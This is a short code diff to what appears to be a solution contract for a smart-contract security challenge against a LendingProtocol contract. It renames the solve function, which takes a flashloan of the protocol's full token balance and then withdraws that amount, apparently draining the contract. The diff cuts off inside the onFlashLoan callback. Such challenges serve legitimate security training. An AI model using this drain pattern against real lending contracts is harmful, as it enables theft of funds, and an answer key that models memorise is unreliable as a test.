@@ -1,8 +1,8 @@
 // SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
 import "../LendingProtocol.sol";
 
-pragma solidity ^0.8.0;
 
 contract LendingProtocolSolution {
     LendingProtocol private lendingProtocol;
@@ -11,12 +11,13 @@ contract LendingProtocolSolution {
         lendingProtocol = LendingProtocol(contractAddress);
     }
 
-    function solveFirstHalf() public {
+    function solve() public {
         address token = lendingProtocol.token();
         uint256 amount = IERC20(token).balanceOf(address(lendingProtocol));
         lendingProtocol.flashloan(amount);
         lendingProtocol.withdraw(amount);
     }
+
     function onFlashLoan(
         address,
         address token,
